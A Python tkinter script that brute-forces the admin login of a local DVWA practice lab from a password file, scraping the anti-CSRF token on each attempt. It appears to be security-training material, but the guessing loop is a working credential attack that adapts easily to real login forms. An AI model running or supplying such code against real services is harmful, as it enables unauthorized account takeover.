import tkinter as tk
from utils import *
import sys

def get_passwords(filename):
    q = []
    with open(filename, 'r') as f:
        for e in f.read().split("\n"):
            q.append(e)
    return q

def send_credentials(session, url, data):
    target_url = url
    for k, v in data.items():
        target_url += f"{k}={v}&"
    target_url = target_url[:-1] + "#"
    response = session.get(target_url)
    return response

def update_textbox(content):
    output_text.insert(tk.END, content + "\n")
    output_text.see(tk.END)
    output_text.update()

if __name__ == "__main__":
    root = tk.Tk()
    root.title("Brute Force Tester")
    output_text = tk.Text(root, height=20, width=80)
    output_text.pack()

    BASE_URL = "http://127.0.0.1/dvwa"
    bruteforce_url = f"{BASE_URL}/vulnerabilities/brute?"
    filename = "password.txt"
    username = "admin"
    q = get_passwords(filename)

    with DVWASessionProxy(BASE_URL) as s:
        s.security = SecurityLevel.HIGH
        for password in q:
            data = {
                "username": username,
                "password": password,
                "Login": "Login"
            }
            if s.security is SecurityLevel.HIGH.value:
                response = s.get(bruteforce_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                user_token = soup.find("input", attrs={"name": "user_token"})["value"]
                data["user_token"] = user_token

            response = send_credentials(s, bruteforce_url, data)
            update_textbox(f"[!] Testing: {password}")
            if "password incorrect." not in response.text:
                update_textbox(f"[+] Found: {password}")
                break

    root.mainloop()
